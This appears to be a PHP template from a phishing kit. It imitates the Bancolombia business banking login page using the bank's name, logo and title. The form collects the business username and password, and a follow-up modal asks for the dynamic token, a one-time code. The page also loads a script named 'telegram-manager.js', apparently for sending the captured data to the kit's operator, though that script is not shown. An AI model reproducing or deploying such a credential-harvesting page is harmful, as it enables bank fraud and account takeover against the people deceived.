<?php
/**
 * Template: Login Form
 * Variables disponibles: $errorMessage, $openToken
 */
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>Iniciar Sesión - Bancolombia</title>
    <link rel="stylesheet" href="/assets/css/styles.css?v=<?= time() ?>">
    <link rel="stylesheet" href="/assets/css/login.css?v=<?= time() ?>">
    <link rel="stylesheet" href="/assets/css/modal.css?v=<?= time() ?>">
    <link rel="stylesheet" href="/assets/css/loading-overlay.css?v=<?= time() ?>">
    <link rel="stylesheet" href="/assets/css/error-message.css?v=<?= time() ?>">
</head>
<body>
    <header class="header">
        <div class="container">
            <img src="/img/logo-bancolombia.png" alt="Bancolombia" class="header__logo">
            <h1 class="header__title">Sucursal Virtual Negocios</h1>
        </div>
    </header>

    <main class="main">
        <div class="container">
            <div class="background-decoration">
                <img src="/img/trazo-auth.svg" alt="" class="decoration-svg" aria-hidden="true">
            </div>

            <div class="login-card">
                <h2 class="login-card__title">Iniciar sesión</h2>

                <?php if (isset($errorMessage) && $errorMessage): ?>
                <div class="error-message active">
                    <p class="error-message__text"><?= htmlspecialchars($errorMessage) ?></p>
                </div>
                <?php endif; ?>

                <form id="loginForm" class="login-form" method="POST" action="/verify-login.php">
                    <div class="form-group">
                        <label class="floating-label">Usuario de Negocios</label>
                        <div class="input-wrapper">
                            <input type="text" name="usuario" class="form-input password-input" required>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="floating-label">Clave de Negocios</label>
                        <div class="input-wrapper">
                            <input type="password" name="clave" class="form-input password-input" required>
                        </div>
                    </div>

                    <button type="submit" class="btn btn-primary">Iniciar sesión</button>
                </form>
            </div>
        </div>
    </main>

    <!-- Token Modal -->
    <div id="tokenModal" class="modal <?= $openToken ? 'active' : '' ?>">
        <div class="modal-content">
            <h3>Ingresa tu token</h3>
            <input type="text" id="tokenInput" placeholder="Token dinámico">
            <button id="submitToken" class="btn btn-primary">Confirmar</button>
        </div>
    </div>

    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-spinner"></div>
    </div>

    <script src="/assets/js/login.js?v=<?= time() ?>"></script>
    <script src="/assets/js/telegram-manager.js?v=<?= time() ?>"></script>
    <script src="/assets/js/token-modal.js?v=<?= time() ?>"></script>
</body>
</html>
